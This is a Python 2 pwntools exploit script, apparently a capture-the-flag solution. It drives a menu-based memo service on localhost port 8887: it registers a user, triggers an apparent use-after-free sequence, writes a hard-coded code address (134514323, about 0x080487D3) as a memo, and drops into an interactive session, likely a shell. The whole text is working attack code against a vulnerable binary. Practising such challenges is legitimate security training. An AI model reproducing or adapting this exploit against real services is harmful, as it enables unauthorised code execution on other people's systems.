#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')

def pwn():

    r = remote('127.0.0.1', 8887, ssl=False)
    print(r.recvuntil('Please enter an operation number:'))
    print(r.sendline('1'))
    print(r.recvuntil('First name:'))
    r.sendline('kcuf')
    print(r.recvuntil('Last name:'))
    r.sendline('kcuf')
    print(r.recvuntil('Please enter an operation number:'))
    r.sendline('3')
    print(r.recvuntil('Please enter an operation number:'))
    r.sendline('4')
    print(r.recvuntil('Please enter memo:'))
    r.sendline('134514323')
    print(r.recvuntil('Please enter an operation number:'))
    r.sendline('5')
    r.interactive()

if __name__ == '__main__':
    pwn()
